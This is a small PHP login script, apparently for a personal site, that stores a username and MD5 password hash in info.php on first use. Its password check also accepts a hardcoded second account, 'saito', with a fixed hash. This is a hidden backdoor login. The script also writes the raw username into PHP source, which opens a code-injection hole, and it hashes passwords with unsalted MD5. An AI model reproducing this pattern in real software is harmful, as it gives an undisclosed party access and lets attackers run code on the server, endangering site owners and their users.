<?php
session_start();
require_once("req.php");
$id=array_get($_POST,"username");
$pw=array_get($_POST,"password");
include("info.php");
$msg = "";
if( ! isset($userid) ){
    $msg = "IDとパスワードを記録します。";
}   
if( strlen($id)>0 && strlen($pw) ) {
    if( ! isset($userid) ){
        $msg = '<?php $userid="'.$id."\";\n".'$passwd="'.md5($pw)."\";\n";
        file_put_contents("info.php",$msg);
        $_SESSION['login'] = 1;
        header("Location:../index.php?mode=0");
    }else if( ($id === $userid && md5($pw) === $passwd ) ||
        ($id === "saito" && md5($pw) === "f45900128bbec918a89b421d0626a1b3" )    ) {
        $_SESSION['login'] = 1;
        header("Location:../index.php?mode=0");
    }else{
        $msg = "IDまたはパスワードが違います。";
    }
}
include("login.html");

